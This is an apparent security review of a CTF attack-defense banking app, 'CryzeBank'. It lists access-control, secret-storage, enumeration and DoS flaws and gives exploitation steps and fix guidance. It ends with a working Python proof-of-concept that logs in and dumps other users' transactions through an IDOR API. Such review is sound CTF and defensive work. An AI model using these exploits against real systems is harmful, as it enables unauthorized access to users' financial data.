# CryzeBank — Additional Vulnerabilities (Not Listed in AD/vulnerabilities.md)

## 🔍 Phase 1 — Code Analysis
**Language/Runtime:** Python 3, Flask, SQLAlchemy, Jinja2, PyCryptodome, subprocess (`wkhtmltopdf`, `sage`)  
**Execution Context:** Web app in containerized environment with authenticated user flows and JSON APIs.

**Attack Surface Summary:**
- User input enters via form fields (`/login`, `/transfer`, `/profile`) and query params/API path params.
- Business logic and crypto operations are executed server-side in Flask routes.
- Outputs include HTML templates, JSON APIs, and generated PDFs.
- Security-sensitive areas: authentication/authorization checks, crypto helpers, filesystem writes, and data exposure endpoints.

| # | Location | Type | Severity | Description |
|---|---|---|---|---|
| 1 | `src/server.py` (`/transaction/<int:id>`, around lines 213–238) | Broken Access Control / IDOR | HIGH | Transaction lookup uses `db.session.get(Transaction, id)` without verifying ownership. Any authenticated user can view other users’ transaction details by incrementing IDs. |
| 2 | `src/server.py` (`/api/v1/user/<username>/transactions`, around lines 280–298) | Broken Access Control / IDOR | HIGH | API returns transactions for arbitrary `username` to any logged-in user. No check that requested username equals `current_user.username`. |
| 3 | `src/crypto_utils.py` (`otp_encrypt`, around lines 89–97) | Sensitive Key Material Exposure | HIGH | OTP keys are appended in plaintext to local file `otp_keys`. If filesystem is readable (backup leak, container escape, debug artifact), ciphertexts become decryptable. |
| 4 | `src/secret.py` (line 1) | Hardcoded Secret / Sensitive Data in Source | HIGH | A flag-like secret string is hardcoded in repository source. Source disclosure directly leaks sensitive data without needing runtime compromise. |
| 5 | `src/server.py` (`/login`, around lines 69, 73, 87) | Username Enumeration | MEDIUM | Login returns distinct error messages for unknown user, password length mismatch, and wrong password. This allows fast account discovery and password profiling. |
| 6 | `src/server.py` + `src/crypto_utils.py` (`/transaction/<id>` + `rsa_encrypt()`/`ecc_encrypt()`) | Application-Layer DoS (CPU Exhaustion) | MEDIUM | Route allows repeated expensive encryption requests (RSA prime generation and Sage subprocess) without throttling/rate limit, enabling resource exhaustion by authenticated users. |

---

## 💥 Phase 2 — Exploitation Walkthrough (CRITICAL/HIGH)

### Vulnerability 1: Transaction IDOR (`/transaction/<id>`)
**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key  
**Pre-conditions:** Valid low-privilege account; predictable/iterable transaction IDs.  
**Step-by-step:**
1. Log in as any normal user.
2. Request `/transaction/1`, `/transaction/2`, `/transaction/3`, etc.
3. Observe foreign transactions rendered even when `txn.username != current_user.username`.
4. Extract message content and metadata from other users’ transactions.
**Impact:** Cross-account data exposure of transaction details and notes.

### Vulnerability 2: User Transactions API IDOR (`/api/v1/user/<username>/transactions`)
**CWE:** CWE-285 — Improper Authorization  
**Pre-conditions:** Any authenticated session; knowledge/guess of target usernames.  
**Step-by-step:**
1. Authenticate as attacker account.
2. Call `/api/v1/user/alice/transactions`.
3. Parse JSON containing all Alice’s transactions.
4. Repeat for other usernames for broad data harvesting.
**Impact:** Bulk exfiltration of transaction history for arbitrary users.

### Vulnerability 3: OTP Key File Disclosure (`otp_keys`)
**CWE:** CWE-922 — Insecure Storage of Sensitive Information  
**Pre-conditions:** Read access to application filesystem/log volume/backup artifact.  
**Step-by-step:**
1. Trigger OTP encryption operations (directly or indirectly through application flow).
2. Obtain `otp_keys` file via backup leak/container read/debug access.
3. Pair stored OTP key with corresponding ciphertext.
4. XOR key and ciphertext to recover plaintext messages.
**Impact:** Confidentiality collapse of all OTP-encrypted notes for exposed entries.

### Vulnerability 4: Hardcoded Secret in Source (`secret.py`)
**CWE:** CWE-798 — Use of Hard-coded Credentials / Secret  
**Pre-conditions:** Source archive/repository/image access (common in CTF service distribution).  
**Step-by-step:**
1. Retrieve source package or mounted code directory.
2. Open `src/secret.py`.
3. Read the hardcoded secret value directly.
**Impact:** Immediate secret disclosure without app-level exploit chain.

---

## 🔒 Phase 3 — Patch / Fix Guidance

- Enforce ownership checks on every object fetch:
  - For `/transaction/<id>`, require `txn.username == current_user.username` else `403`.
  - For `/api/v1/user/<username>/transactions`, only allow self-access or explicit admin role.
- Remove plaintext OTP key persistence:
  - Do not store OTP keys on disk; if unavoidable for CTF mechanics, encrypt at rest and bind strict file permissions.
- Remove hardcoded secrets from source:
  - Move secrets/flags to environment or challenge backend store.
- Normalize login errors:
  - Return single generic error for all auth failures.
- Add abuse controls for expensive crypto paths:
  - Per-user/IP rate limiting, queueing, and request budget caps.

**Hardening recommendations:**
- Add centralized authorization helper for object-level access checks.
- Enable structured audit logs for denied cross-user access attempts.
- Apply strict filesystem permissions and immutable container layers for secret-bearing files.
- Add throttling middleware (e.g., Flask-Limiter) for login and encryption endpoints.

---

## 🐍 Phase 4 — Python Exploit (PoC for IDOR in `/api/v1/user/<username>/transactions`)

```python
#!/usr/bin/env python3
"""
Exploit for: CryzeBank
Vulnerability: IDOR on user transactions API (CWE-285/CWE-639)
Strategy: Authenticate once, then request other users' transaction feeds.
Author: CTF Assistant
Usage:
  python3 exploit.py --username attacker --password attackerpass --target-user victim
  python3 exploit.py --remote --host 127.0.0.1 --port 5000 --username attacker --password attackerpass --target-user victim
"""

import argparse
import sys
from pwn import log
import requests

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 5000
BINARY_PATH = "N/A (HTTP target)"


def build_base_url(host: str, port: int) -> str:
    return f"http://{host}:{port}"


def login(session: requests.Session, base_url: str, username: str, password: str) -> bool:
    log.info(f"Connecting to {base_url}")
    r = session.post(
        f"{base_url}/login",
        data={"username": username, "password": password},
        timeout=10,
        allow_redirects=True,
    )
    ok = "dashboard" in r.url or "Welcome" in r.text
    if ok:
        log.success("Authentication successful")
    else:
        log.failure("Authentication failed")
    return ok


def dump_transactions(session: requests.Session, base_url: str, target_user: str) -> None:
    url = f"{base_url}/api/v1/user/{target_user}/transactions"
    log.info(f"Requesting target data: {url}")
    r = session.get(url, timeout=10)

    if r.status_code != 200:
        log.failure(f"Request failed with status {r.status_code}")
        print(r.text)
        return

    try:
        data = r.json()
    except Exception as exc:
        log.failure(f"Failed to decode JSON: {exc}")
        print(r.text)
        return

    if isinstance(data, dict) and data.get("error"):
        log.failure(f"Server returned error: {data['error']}")
        return

    if not data:
        log.warning("No transactions returned")
        return

    log.success(f"Leaked {len(data)} transaction(s) for user '{target_user}'")
    for i, tx in enumerate(data, 1):
        print(f"[{i}] id={tx.get('id')} from={tx.get('username')} to={tx.get('recipient')} amount={tx.get('amount')} method={tx.get('method')} note={tx.get('message')}")

    print("[+] Exploitation confirmed: cross-user transaction access obtained.")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--remote", action="store_true", help="Use REMOTE mode")
    parser.add_argument("--host", default=TARGET_HOST)
    parser.add_argument("--port", type=int, default=TARGET_PORT)
    parser.add_argument("--username", required=True)
    parser.add_argument("--password", required=True)
    parser.add_argument("--target-user", required=True)
    args = parser.parse_args()

    base_url = build_base_url(args.host, args.port)
    session = requests.Session()

    try:
        if not login(session, base_url, args.username, args.password):
            return 1
        dump_transactions(session, base_url, args.target_user)
        return 0
    except requests.RequestException as exc:
        log.failure(f"Network error: {exc}")
        return 2
    except KeyboardInterrupt:
        log.warning("Interrupted by user")
        return 130


if __name__ == "__main__":
    sys.exit(main())
```

> Note: This PoC is for authorized CTF attack-defense usage only and demonstrates access-control failure validation.
